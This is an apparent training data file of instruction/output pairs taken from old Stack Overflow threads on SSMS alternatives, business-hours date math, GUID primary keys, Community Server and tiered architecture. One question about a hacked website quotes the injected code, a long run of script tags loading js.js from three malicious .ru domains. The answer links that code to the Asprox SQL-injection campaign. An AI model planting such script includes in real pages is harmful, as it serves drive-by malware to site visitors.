{"instruction": "I was wondering if there are any alternatives to Microsoft's SQL Server Management Studio?\nNot there's anything wrong with SSMS, but sometimes it just seem too big an application where all I want todo is browse/edit tables and run queries.", "output": "There is an express version on SSMS that has considerably fewer features but still has the basics."}
{"instruction": "I was wondering if there are any alternatives to Microsoft's SQL Server Management Studio?\nNot there's anything wrong with SSMS, but sometimes it just seem too big an application where all I want todo is browse/edit tables and run queries.", "output": "I've started using LinqPad. In addition to being more lightweight than SSMS, you can also practice writing LINQ queries- way more fun than boring old TSQL!"}
{"instruction": "I have a situation where I want to add hours to a date and have the new date wrap around the work-day. I cobbled up a function to determine this new date, but want to make sure that I'm not forgetting anything.\nThe hours to be added is called \"delay\". It could easily be a parameter to the function instead.\nPlease post any suggestions. [VB.NET Warning]\nPrivate Function GetDateRequired() As Date\n    ''// A decimal representation of the current hour\n    Dim hours As Decimal = Decimal.Parse(Date.Now.Hour) + (Decimal.Parse(Date.Now.Minute) / 60.0) \n\n    Dim delay As Decimal = 3.0           ''// delay in hours\n    Dim endOfDay As Decimal = 12.0 + 5.0 ''// end of day, in hours\n    Dim startOfDay As Decimal = 8.0      ''// start of day, in hours\n\n    Dim newHour As Integer\n    Dim newMinute As Integer\n\n    Dim dateRequired As Date = Now\n    Dim delta As Decimal = hours + delay\n\n    ''// Wrap around to the next day, if necessary\n    If delta > endOfDay Then\n        delta = delta - endOfDay\n        dateRequired = dateRequired.AddDays(1)\n\n        newHour = Integer.Parse(Decimal.Truncate(delta))\n        newMinute = Integer.Parse(Decimal.Truncate((delta - newHour) * 60))\n        newHour = startOfDay + newHour\n    Else\n        newHour = Integer.Parse(Decimal.Truncate(delta))\n        newMinute = Integer.Parse(Decimal.Truncate((delta - newHour) * 60))\n    End If\n\n    dateRequired = New Date(dateRequired.Year, dateRequired.Month, dateRequired.Day, newHour, newMinute, 0)\n\n    Return dateRequired\nEnd Sub\n\nNote: This will probably not work if delay is more than 9 hours long. It should never change from 3, through.\nEDIT:\nThe goal is find the date and time that you get as a result of adding several hours to the current time. This is used to determine a default value for a due date of a submission. I want to add 3 hours to the current time to get the due date time. However, I don't want due dates that go beyond 5pm on the current day. So, I tried to have the hours split between (today, up to 5pm) and (tomorrow, from 8am on), such that adding 3 hours to 4pm would give you 19am, because 1 hour is added to the end of today and 2 hours are added to the beginning of tomorrow.", "output": "You should probably write some automated tests for each condition you can think of, and then just start brainstorming more, writing the tests as you think of them.  This way, you can see for sure it will work, and will continue to work if you make further changes.  Look up Test Driven Development if you like the results."}
{"instruction": "I'm wondering how to make a release build that includes all necessary dll files into the .exe so the program can be run on a non-development machine without it having to install the microsoft redistributable on the target machine.\nWithout doing this you get the error message that the application configuration is not correct and to reinstall.", "output": "You need to set the run-time library (Under C/C++ -> Code Generation) for ALL projects to static linkage, which correlates to the following default building configurations:\n\nMultithreaded Debug/Release\nSinglethreaded Debug/Release\nAs opposed to the \"DLL\" versions of those libraries.\nEven if you do that, depending on the libraries you're using, you might have to install a Merge Module/framework/etc. It depends on whether static LIB versions of your dependencies are available."}
{"instruction": "I have a situation where I want to add hours to a date and have the new date wrap around the work-day. I cobbled up a function to determine this new date, but want to make sure that I'm not forgetting anything.\nThe hours to be added is called \"delay\". It could easily be a parameter to the function instead.\nPlease post any suggestions. [VB.NET Warning]\nPrivate Function GetDateRequired() As Date\n    ''// A decimal representation of the current hour\n    Dim hours As Decimal = Decimal.Parse(Date.Now.Hour) + (Decimal.Parse(Date.Now.Minute) / 60.0) \n\n    Dim delay As Decimal = 3.0           ''// delay in hours\n    Dim endOfDay As Decimal = 12.0 + 5.0 ''// end of day, in hours\n    Dim startOfDay As Decimal = 8.0      ''// start of day, in hours\n\n    Dim newHour As Integer\n    Dim newMinute As Integer\n\n    Dim dateRequired As Date = Now\n    Dim delta As Decimal = hours + delay\n\n    ''// Wrap around to the next day, if necessary\n    If delta > endOfDay Then\n        delta = delta - endOfDay\n        dateRequired = dateRequired.AddDays(1)\n\n        newHour = Integer.Parse(Decimal.Truncate(delta))\n        newMinute = Integer.Parse(Decimal.Truncate((delta - newHour) * 60))\n        newHour = startOfDay + newHour\n    Else\n        newHour = Integer.Parse(Decimal.Truncate(delta))\n        newMinute = Integer.Parse(Decimal.Truncate((delta - newHour) * 60))\n    End If\n\n    dateRequired = New Date(dateRequired.Year, dateRequired.Month, dateRequired.Day, newHour, newMinute, 0)\n\n    Return dateRequired\nEnd Sub\n\nNote: This will probably not work if delay is more than 9 hours long. It should never change from 3, through.\nEDIT:\nThe goal is find the date and time that you get as a result of adding several hours to the current time. This is used to determine a default value for a due date of a submission. I want to add 3 hours to the current time to get the due date time. However, I don't want due dates that go beyond 5pm on the current day. So, I tried to have the hours split between (today, up to 5pm) and (tomorrow, from 8am on), such that adding 3 hours to 4pm would give you 19am, because 1 hour is added to the end of today and 2 hours are added to the beginning of tomorrow.", "output": "Okay, how about these? The difference between the approaches should speak for themselves.\nAlso, this is tested about as far as I can throw it. The warranty lasts until... now.\nHope it helps!Module Module1\r\n\r\n    Public Function IsInBusinessHours(ByVal d As Date) As Boolean\r\n        Return Not (d.Hour < 8 OrElse d.Hour > 17 OrElse d.DayOfWeek = DayOfWeek.Saturday OrElse d.DayOfWeek = DayOfWeek.Sunday)\r\n    End Function\r\n\r\n\r\n    Public Function AddInBusinessHours(ByVal fromDate As Date, ByVal hours As Integer) As Date\r\n        Dim work As Date = fromDate.AddHours(hours)\r\n        While Not IsInBusinessHours(work)\r\n            work = work.AddHours(1)\r\n        End While\r\n        Return work\r\n    End Function\r\n\r\n\r\n    Public Function LoopInBusinessHours(ByVal fromDate As Date, ByVal hours As Integer) As Date\r\n        Dim work As Date = fromDate\r\n        While hours > 0\r\n            While hours > 0 AndAlso IsInBusinessHours(work)\r\n                work = work.AddHours(1)\r\n                hours -= 1\r\n            End While\r\n            While Not IsInBusinessHours(work)\r\n                work = work.AddHours(1)\r\n            End While\r\n        End While\r\n        Return work\r\n    End Function\r\n\r\n    Sub Main()\r\n        Dim test As Date = New Date(2008, 8, 8, 15, 0, 0)\r\n        Dim hours As Integer = 5\r\n        Console.WriteLine(\"Date: \" + test.ToString() + \", \" + hours.ToString())\r\n        Console.WriteLine(\"Just skipping: \" + AddInBusinessHours(test, hours))\r\n        Console.WriteLine(\"Looping: \" + LoopInBusinessHours(test, hours))\r\n        Console.ReadLine()\r\n    End Sub\r\n\r\nEnd Module"}
{"instruction": "I'm wondering if it's a good idea to make verifications in getters and setters, or elsewhere in the code.\nThis might surprise you be when it comes to optimizations and speeding up the code, I think you should not make verifications in getters and setters, but in the code where you're updating your files or database. Am I wrong?", "output": "I like to implement IDataErrorInfo and put my validation logic in its Error and this[columnName] properties. That way if you want to check programmatically whether there's an error you can simply test either of those properties in code, or you can hand the validation off to the data binding in Web Forms, Windows Forms or WPF. \nWPF's \"ValidatesOnDataError\" Binding property makes this particularly easy."}
{"instruction": "My dad called me today and said people going to his website were getting 168 viruses trying to download to their computers. He isn't technical at all, and built the whole thing with a WYSIWYG editor.\nI popped his site open and viewed the source, and there was a line of Javascript includes at the bottom of the source right before the closing HTML tag. They included this file (among many others): http://www.98hs.ru/js.js <-- TURN OFF JAVASCRIPT BEFORE YOU GO TO THAT URL.\nSo I commented it out for now. It turns out his ftp password was a plain dictionary word six letters long, so we think that's how it got hacked. We've changed his password to an 8+ digit non-word string (he wouldn't go for a passphrase since he is a hunt-n-peck typer).\nI did a whois on 98hs.ru and found it is hosted from a server in Chile. There is actually an e-mail address associated with it too, but I seriously doubt this person is the culprit. Probably just some other site that got hacked...\nI have no idea what to do at this point though as I've never dealt with this sort of thing before. Anyone have any suggestions?\nHe was using plain jane un-secured ftp through webhost4life.com. I don't even see a way to do sftp on their site. I'm thinking his username and password got intercepted?\nSo, to make this more relevant to the community, what are the steps you should take/best practices you should follow to protect your website from getting hacked?\nFor the record, here is the line of code that \"magically\" got added to his file (and isn't in his file on his computer -- I've left it commented out just to make absolute sure it won't do anything on this page, although I'm sure Jeff would guard against this):\n<!--script src=http://www.98hs.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script-->", "output": "I know this is a little late in the game, but the URL mentioned for the JavaScript is mentioned in a list of sites known to have been part of the ASPRox bot resurgence that started up in June (at least that's when we were getting flagged with it). Some details about it are mentioned below:\nhttp://www.bloombit.com/Articles/2008/05/ASCII-Encoded-Binary-String-Automated-SQL-Injection.aspx \nThe nasty thing about this is that effectively every varchar type field in the database is \"infected\" to spit out a reference to this URL, in which the the browser gets an tiny iframe that turns it into a bot. A basic SQL fix for this can be found here:\nhttp://aspadvice.com/blogs/programming_shorts/archive/2008/06/27/Asprox-Recovery.aspx\nThe scary thing though is that the virus looks to the system tables for values to infect and a lot of shared hosting plans also share the database space for their clients. So most likely it wasn't even your dad's site that was infected, but somebody else's site within his hosting cluster that wrote some poor code and opened the door to SQL Injection attack.\nIf he hasn't done so yet, I'd send an URGENT e-mail to their host and give them a link to that SQL code to fix the entire system. You can fix your own affected database tables, but most likely the bots that are doing the infection are going to pass right through that hole again and infect the whole lot.\nHopefully this gives you some more info to work with.\nEDIT: One more quick thought, if he's using one of the hosts online design tools for building his website, all of that content is probably sitting in a column and was infected that way."}
{"instruction": "The company I work for is wanting to add blog functionality to our website and they were looking to spend an awful amount of money to have some crap being built on top of a CMS they purchased (sitecore).  I pointed them to Telligent's Community Server and  we had a sales like meeting today to get the Marketing folks on board. \r\nMy question is if anyone has had issues working with Community Server, skinning it and extending it?\r\nI wanted to explain a bit why I am thinking Community Server, the company is wanting multiple blogs with multiple authors.  I want to be out of the admin part of this as much as possible and didn't think there were too many engines that having multiple blogs didn't mean db work.  I also like the other functionality that Community Server provides and think the company will find it useful, particularly the media section as right now we have some really shotty way of dealing with whitepapers and stuff.\nedit: We are actually using the Sitecore blog module for a single blog on our intranet (which is actually what the CMS is serving).  Some reasoning for why I don't like it for our public site are they are on different servers, it doesn't support multiple authors, there is no built in syndication, it is a little flimsy feeling to me from looking at the source and I personally think the other features of Community Server make its price tag worth it.\nanother edit: Need to stick to .net software that run on sql server in my company's case, but I don't mind seeing recommendations for others.  ExpressionEngine looks promising, will try it out on my personal box.", "output": "I've done quite a few projects using Community Server. If you're okay with the out-of-the-box functionality, or you don't mind sticking to the version you start with, I think you'll be very happy.\nThe times I've run into headaches using CS is when the client wants functionality CS does not provide, but also insists on keeping the ability to upgrade to the latest version whenever Telligent releases an update. You can mostly support that by making all of your changes either in a separate project or by only modifying aspx/ascx files (no codebehinds). Some kind of merge is going to be required though no matter how well you plan it out."}
{"instruction": "The company I work for is wanting to add blog functionality to our website and they were looking to spend an awful amount of money to have some crap being built on top of a CMS they purchased (sitecore).  I pointed them to Telligent's Community Server and  we had a sales like meeting today to get the Marketing folks on board. \r\nMy question is if anyone has had issues working with Community Server, skinning it and extending it?\r\nI wanted to explain a bit why I am thinking Community Server, the company is wanting multiple blogs with multiple authors.  I want to be out of the admin part of this as much as possible and didn't think there were too many engines that having multiple blogs didn't mean db work.  I also like the other functionality that Community Server provides and think the company will find it useful, particularly the media section as right now we have some really shotty way of dealing with whitepapers and stuff.\nedit: We are actually using the Sitecore blog module for a single blog on our intranet (which is actually what the CMS is serving).  Some reasoning for why I don't like it for our public site are they are on different servers, it doesn't support multiple authors, there is no built in syndication, it is a little flimsy feeling to me from looking at the source and I personally think the other features of Community Server make its price tag worth it.\nanother edit: Need to stick to .net software that run on sql server in my company's case, but I don't mind seeing recommendations for others.  ExpressionEngine looks promising, will try it out on my personal box.", "output": "Community Server itself has been very solid for me, but if all you need is a blogging engine then it may be overkill. Skinning it, for example, is quite a bit of work (despite their quite powerful Chameleon theme engine).\nI'd probably look closer at one of the dedicated blog engines out there, like BlogEngine.NET, dasBlog or SubText, if that's all you need. Go with Community Server if you think you'll want more \"community-focused\" features like forums etc."}
{"instruction": "I was wondering if there are any alternatives to Microsoft's SQL Server Management Studio?\nNot there's anything wrong with SSMS, but sometimes it just seem too big an application where all I want todo is browse/edit tables and run queries.", "output": "If you are already spending time in Visual Studio, then you can always use the Server Explorer to connect to any .Net compliant database server.\nProvided you're using Professional or greater, you can create and edit tables and databases, run queries, etc."}
{"instruction": "The company I work for is wanting to add blog functionality to our website and they were looking to spend an awful amount of money to have some crap being built on top of a CMS they purchased (sitecore).  I pointed them to Telligent's Community Server and  we had a sales like meeting today to get the Marketing folks on board. \r\nMy question is if anyone has had issues working with Community Server, skinning it and extending it?\r\nI wanted to explain a bit why I am thinking Community Server, the company is wanting multiple blogs with multiple authors.  I want to be out of the admin part of this as much as possible and didn't think there were too many engines that having multiple blogs didn't mean db work.  I also like the other functionality that Community Server provides and think the company will find it useful, particularly the media section as right now we have some really shotty way of dealing with whitepapers and stuff.\nedit: We are actually using the Sitecore blog module for a single blog on our intranet (which is actually what the CMS is serving).  Some reasoning for why I don't like it for our public site are they are on different servers, it doesn't support multiple authors, there is no built in syndication, it is a little flimsy feeling to me from looking at the source and I personally think the other features of Community Server make its price tag worth it.\nanother edit: Need to stick to .net software that run on sql server in my company's case, but I don't mind seeing recommendations for others.  ExpressionEngine looks promising, will try it out on my personal box.", "output": "Have you had a look at the Shared Source blog module for Sitecore?"}
{"instruction": "I just found /n softwares free Powershell NetCmdlets, and after playing with them I love the functionality they bring to the command line.  So it raises the question what are your favorite Cmdlets, and how do you use them?", "output": "there's an out-twitter script i use for posting to twitter. it's nice, as it means you can send something to twitter without the risk of being distracted by a browser.\ni added an alias for it, \"twit\".\nso now you can type, for example:\nPS C:\\>\"trying out stack overflow\" | twit\nand if successfully lodged, it will return an integer that identifies your post."}
{"instruction": "I'm wondering if it's a good idea to make verifications in getters and setters, or elsewhere in the code.\nThis might surprise you be when it comes to optimizations and speeding up the code, I think you should not make verifications in getters and setters, but in the code where you're updating your files or database. Am I wrong?", "output": "@Terrapin, re:\n\nIf all you have is a bunch of [simple\r\n  public set/get] properties ... they\r\n  might as well be fields\n\nProperties have other advantages over fields. They're a more explicit contract, they're  serialized, they can be debugged later, they're a nice place for extension through inheritance. The clunkier syntax is an accidental complexity -- .net 3.5 for example overcomes this.\nA common (and flawed) practice is to start with public fields, and turn them into properties later, on an 'as needed' basis. This breaks your contract with anyone who consumes your class, so it's best to start with properties."}
{"instruction": "The company I work for is wanting to add blog functionality to our website and they were looking to spend an awful amount of money to have some crap being built on top of a CMS they purchased (sitecore).  I pointed them to Telligent's Community Server and  we had a sales like meeting today to get the Marketing folks on board. \r\nMy question is if anyone has had issues working with Community Server, skinning it and extending it?\r\nI wanted to explain a bit why I am thinking Community Server, the company is wanting multiple blogs with multiple authors.  I want to be out of the admin part of this as much as possible and didn't think there were too many engines that having multiple blogs didn't mean db work.  I also like the other functionality that Community Server provides and think the company will find it useful, particularly the media section as right now we have some really shotty way of dealing with whitepapers and stuff.\nedit: We are actually using the Sitecore blog module for a single blog on our intranet (which is actually what the CMS is serving).  Some reasoning for why I don't like it for our public site are they are on different servers, it doesn't support multiple authors, there is no built in syndication, it is a little flimsy feeling to me from looking at the source and I personally think the other features of Community Server make its price tag worth it.\nanother edit: Need to stick to .net software that run on sql server in my company's case, but I don't mind seeing recommendations for others.  ExpressionEngine looks promising, will try it out on my personal box.", "output": "Expression Engine with the Multi-Site Manager works great for that kind of situation."}
{"instruction": "I have a situation where I want to add hours to a date and have the new date wrap around the work-day. I cobbled up a function to determine this new date, but want to make sure that I'm not forgetting anything.\nThe hours to be added is called \"delay\". It could easily be a parameter to the function instead.\nPlease post any suggestions. [VB.NET Warning]\nPrivate Function GetDateRequired() As Date\n    ''// A decimal representation of the current hour\n    Dim hours As Decimal = Decimal.Parse(Date.Now.Hour) + (Decimal.Parse(Date.Now.Minute) / 60.0) \n\n    Dim delay As Decimal = 3.0           ''// delay in hours\n    Dim endOfDay As Decimal = 12.0 + 5.0 ''// end of day, in hours\n    Dim startOfDay As Decimal = 8.0      ''// start of day, in hours\n\n    Dim newHour As Integer\n    Dim newMinute As Integer\n\n    Dim dateRequired As Date = Now\n    Dim delta As Decimal = hours + delay\n\n    ''// Wrap around to the next day, if necessary\n    If delta > endOfDay Then\n        delta = delta - endOfDay\n        dateRequired = dateRequired.AddDays(1)\n\n        newHour = Integer.Parse(Decimal.Truncate(delta))\n        newMinute = Integer.Parse(Decimal.Truncate((delta - newHour) * 60))\n        newHour = startOfDay + newHour\n    Else\n        newHour = Integer.Parse(Decimal.Truncate(delta))\n        newMinute = Integer.Parse(Decimal.Truncate((delta - newHour) * 60))\n    End If\n\n    dateRequired = New Date(dateRequired.Year, dateRequired.Month, dateRequired.Day, newHour, newMinute, 0)\n\n    Return dateRequired\nEnd Sub\n\nNote: This will probably not work if delay is more than 9 hours long. It should never change from 3, through.\nEDIT:\nThe goal is find the date and time that you get as a result of adding several hours to the current time. This is used to determine a default value for a due date of a submission. I want to add 3 hours to the current time to get the due date time. However, I don't want due dates that go beyond 5pm on the current day. So, I tried to have the hours split between (today, up to 5pm) and (tomorrow, from 8am on), such that adding 3 hours to 4pm would give you 19am, because 1 hour is added to the end of today and 2 hours are added to the beginning of tomorrow.", "output": "I've worked with the following formula (pseudocode) with some success:now <- number of minutes since the work day starteddelay <- number of minutes in the delayday <- length of a work day in minutesx <- (now + delay) / day {integer division}y <- (now + delay) % day {modulo remainder}return startoftoday + x {in days} + y {in minutes}"}
{"instruction": "I have several tables whose only unique data is a uniqueidentifier (a Guid) column. Because guids are non-sequential (and they're client-side generated so I can't use newsequentialid()), I have made a non-primary, non-clustered index on this ID field rather than giving the tables a clustered primary key.\nI'm wondering what the performance implications are for this approach. I've seen some people suggest that tables should have an auto-incrementing (\"identity\") int as a clustered primary key even if it doesn't have any meaning, as it means that the database engine itself can use that value to quickly look up a row instead of having to use a bookmark.\nMy database is merge-replicated across a bunch of servers, so I've shied away from identity int columns as they're a bit hairy to get right in replication.\nWhat are your thoughts? Should tables have primary keys? Or is it ok to not have any clustered indexes if there are no sensible columns to index that way?", "output": "I too have always heard having an auto-incrementing int is good for performance even if you don't actually use it."}
{"instruction": "I have several tables whose only unique data is a uniqueidentifier (a Guid) column. Because guids are non-sequential (and they're client-side generated so I can't use newsequentialid()), I have made a non-primary, non-clustered index on this ID field rather than giving the tables a clustered primary key.\nI'm wondering what the performance implications are for this approach. I've seen some people suggest that tables should have an auto-incrementing (\"identity\") int as a clustered primary key even if it doesn't have any meaning, as it means that the database engine itself can use that value to quickly look up a row instead of having to use a bookmark.\nMy database is merge-replicated across a bunch of servers, so I've shied away from identity int columns as they're a bit hairy to get right in replication.\nWhat are your thoughts? Should tables have primary keys? Or is it ok to not have any clustered indexes if there are no sensible columns to index that way?", "output": "When dealing with indexes, you have to determine what your table is going to be used for.  If you are primarily inserting 1000 rows a second and not doing any querying, then a clustered index is a hit to performance.  If you are doing 1000 queries a second, then not having an index will lead to very bad performance.  The best thing to do when trying to tune queries/indexes is to use the Query Plan Analyzer and SQL Profiler in SQL Server.  This will show you where you are running into costly table scans or other performance blockers.\nAs for the GUID vs ID argument, you can find people online that swear by both.  I have always been taught to use GUIDs unless I have a really good reason not to.  Jeff has a good post that talks about the reasons for using GUIDs: http://www.codinghorror.com/blog/archives/000817.html.\nAs with most anything development related, if you are looking to improve performance there is not one, single right answer.  It really depends on what you are trying to accomplish and how you are implementing the solution.  The only true answer is to test, test, and test again against performance metrics to ensure that you are meeting your goals.\n[Edit]\r\n@Matt, after doing some more research on the GUID/ID debate I came across this post.  Like I mentioned before, there is not a true right or wrong answer.  It depends on your specific implementation needs.  But these are some pretty valid reasons to use GUIDs as the primary key:\n\nFor example, there is an issue known as a \"hotspot\", where certain pages of data in a table are under relatively high currency contention. Basically, what happens is most of the traffic on a table (and hence page-level locks) occurs on a small area of the table, towards the end. New records will always go to this hotspot, because IDENTITY is a sequential number generator. These inserts are troublesome because they require Exlusive page lock on the page they are added to (the hotspot). This effectively serializes all inserts to a table thanks to the page locking mechanism. NewID() on the other hand does not suffer from hotspots. Values generated using the NewID() function are only sequential for short bursts of inserts (where the function is being called very quickly, such as during a multi-row insert), which causes the inserted rows to spread randomly throughout the table's data pages instead of all at the end - thus eliminating a hotspot from inserts.\nAlso, because the inserts are randomly distributed, the chance of page splits is greatly reduced. While a page split here and there isnt too bad, the effects do add up quickly. With IDENTITY, page Fill Factor is pretty useless as a tuning mechanism and might as well be set to 100% - rows will never be inserted in any page but the last one. With NewID(), you can actually make use of Fill Factor as a performance-enabling tool. You can set Fill Factor to a level that approximates estimated volume growth between index rebuilds, and then schedule the rebuilds during off-peak hours using dbcc reindex. This effectively delays the performance hits of page splits until off-peak times.\nIf you even think you might need to enable replication for the table in question - then you might as well make the PK a uniqueidentifier and flag the guid field as ROWGUIDCOL. Replication will require a uniquely valued guid field with this attribute, and it will add one if none exists. If a suitable field exists, then it will just use the one thats there.\nYet another huge benefit for using GUIDs for PKs is the fact that the value is indeed guaranteed unique - not just among all values generated by this server, but all values generated by all computers - whether it be your db server, web server, app server, or client machine. Pretty much every modern language has the capability of generating a valid guid now - in .NET you can use System.Guid.NewGuid. This is VERY handy when dealing with cached master-detail datasets in particular. You dont have to employ crazy temporary keying schemes just to relate your records together before they are committed. You just fetch a perfectly valid new Guid from the operating system for each new record's permanent key value at the time the record is created. \nhttp://forums.asp.net/t/264350.aspx"}
{"instruction": "I have several tables whose only unique data is a uniqueidentifier (a Guid) column. Because guids are non-sequential (and they're client-side generated so I can't use newsequentialid()), I have made a non-primary, non-clustered index on this ID field rather than giving the tables a clustered primary key.\nI'm wondering what the performance implications are for this approach. I've seen some people suggest that tables should have an auto-incrementing (\"identity\") int as a clustered primary key even if it doesn't have any meaning, as it means that the database engine itself can use that value to quickly look up a row instead of having to use a bookmark.\nMy database is merge-replicated across a bunch of servers, so I've shied away from identity int columns as they're a bit hairy to get right in replication.\nWhat are your thoughts? Should tables have primary keys? Or is it ok to not have any clustered indexes if there are no sensible columns to index that way?", "output": "The primary key serves three purposes:\n\nindicates that the column(s) should be unique\nindicates that the column(s) should be non-null\ndocument the intent that this is the unique identifier of the row\n\nThe first two can be specified in lots of ways, as you have already done.\nThe third reason is good:\n\nfor humans, so they can easily see your intent\nfor the computer, so a program that might compare or otherwise process your table can query the database for the table's primary key.\n\nA primary key doesn't have to be an auto-incrementing number field, so I would say that it's a good idea to specify your guid column as the primary key."}
{"instruction": "I have a route that I am calling through a RedirectToRoute like this:\nreturn this.RedirectToRoute(\"Super-SuperRoute\", new { year = selectedYear });\n\nI have also tried:\n return this.RedirectToRoute(\"Super-SuperRoute\", new { controller = \"Super\", action = \"SuperRoute\", id = \"RouteTopic\", year = selectedYear });\n\nThe route in the global.asax is like this:\nroutes.MapRoute(\n    \"Super-SuperRoute\", // Route name\n    \"Super.mvc/SuperRoute/{year}\",  // URL with parameters\n     new { controller = \"Super\", action = \"SuperRoute\", id = \"RouteTopic\" }  // Parameter defaults\n);\n\nSo why do I get the error: \"No route in the route table matches the supplied values.\"?\nI saw that the type of selectedYear was var.  When I tried to convert to int with int.Parse I realised that selectedYear was actually null, which would explain the problems.  I guess next time I'll pay more attention to the values of the variables at a breakpoint :)", "output": "What type is selectedYear? A DateTime? If so then you might need to convert to a string."}
{"instruction": "I have several tables whose only unique data is a uniqueidentifier (a Guid) column. Because guids are non-sequential (and they're client-side generated so I can't use newsequentialid()), I have made a non-primary, non-clustered index on this ID field rather than giving the tables a clustered primary key.\nI'm wondering what the performance implications are for this approach. I've seen some people suggest that tables should have an auto-incrementing (\"identity\") int as a clustered primary key even if it doesn't have any meaning, as it means that the database engine itself can use that value to quickly look up a row instead of having to use a bookmark.\nMy database is merge-replicated across a bunch of servers, so I've shied away from identity int columns as they're a bit hairy to get right in replication.\nWhat are your thoughts? Should tables have primary keys? Or is it ok to not have any clustered indexes if there are no sensible columns to index that way?", "output": "A Primary Key needn't be an autoincrementing field, in many cases this just means you are complicating your table structure.\nInstead, a Primary Key should be the minimum collection of attributes (note that most DBMS will allow a composite primary key) that uniquely identifies a tuple.\nIn technical terms, it should be the field that every other field in the tuple is fully functionally dependent upon.  (If it isn't you might need to normalise).\nIn practice, performance issues may mean that you merge tables, and use an incrementing field, but I seem to recall something about premature optimisation being evil..."}
{"instruction": "I'm pretty new to my company (2 weeks) and we're starting a new platform for our system using .NET 3.5 Team Foundation from DotNetNuke. Our \"architect\" is suggesting we use one class project. Of course, I chime back with a \"3-tier\" architecture (Business, Data, Web class projects). \nIs there any disadvantages to using this architecture? Pro's would be separation of code from data, keeping class objects away from your code, etc.", "output": "it tends to take an inexperienced team longer to build 3-tier.It's more code, so more bugs. I'm just playing the devil's advocate though."}
{"instruction": "I'm pretty new to my company (2 weeks) and we're starting a new platform for our system using .NET 3.5 Team Foundation from DotNetNuke. Our \"architect\" is suggesting we use one class project. Of course, I chime back with a \"3-tier\" architecture (Business, Data, Web class projects). \nIs there any disadvantages to using this architecture? Pro's would be separation of code from data, keeping class objects away from your code, etc.", "output": "I guess a fairly big downside is that the extra volume of code that you have to write, manage and maintain for a small project may just be overkill.\nIt's all down to what's appropriate for the size of the project, the expected life of the final project and the budget!  Sometimes, whilst doing things 'properly' is appealing, doing something a little more 'lightweight' can be the right commercial decision!"}
{"instruction": "I'm pretty new to my company (2 weeks) and we're starting a new platform for our system using .NET 3.5 Team Foundation from DotNetNuke. Our \"architect\" is suggesting we use one class project. Of course, I chime back with a \"3-tier\" architecture (Business, Data, Web class projects). \nIs there any disadvantages to using this architecture? Pro's would be separation of code from data, keeping class objects away from your code, etc.", "output": "I would be pushing hard for the N tiered approach even if it's a small project. If you use an ORM tool like codesmith + nettiers you will be able to quickly setup the projects and be developing code that solves your business problems quickly.\nIt kills me when you start a new project and you spend days sitting around spinning wheels talking about how the \"architecture\" should be architected. You want to be spending time solving the business problem, not solving problems that other people have solved for you. Using an ORM (it doesn't really matter which one, just pick one and stick to it) to help you get initial traction will help keep you focussed on the goals of the project and not distract you trying to solve \"architecture\" issues.\nIf, at the end of the day, the architect wants to go the one project approach, there is no reason you can't create an app_code folder with a BLL and DAL folder to seperate the code for now which will help you move to an N-Tiered solution later."}
{"instruction": "I'm pretty new to my company (2 weeks) and we're starting a new platform for our system using .NET 3.5 Team Foundation from DotNetNuke. Our \"architect\" is suggesting we use one class project. Of course, I chime back with a \"3-tier\" architecture (Business, Data, Web class projects). \nIs there any disadvantages to using this architecture? Pro's would be separation of code from data, keeping class objects away from your code, etc.", "output": "As with anything abstraction creates complexity, and so the complexity of doing N-tiered should be properly justified, e.g., does N-tiered actually benefit the system? There will be small systems that will work best with N-tiered, although a lot of them will not.\nAlso, even if your system is small at the moment, you might want to add more features to it later -- not going N-tiered might consitute a sort of technical debt on your part, so you have to be careful."}
